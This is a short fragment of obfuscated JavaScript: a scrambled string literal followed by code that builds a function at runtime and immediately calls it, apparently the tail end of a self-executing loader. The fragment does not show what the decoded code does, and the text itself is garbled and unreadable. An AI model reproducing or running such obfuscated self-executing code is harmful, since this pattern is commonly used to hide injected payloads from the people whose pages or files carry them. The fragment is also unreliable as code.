6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
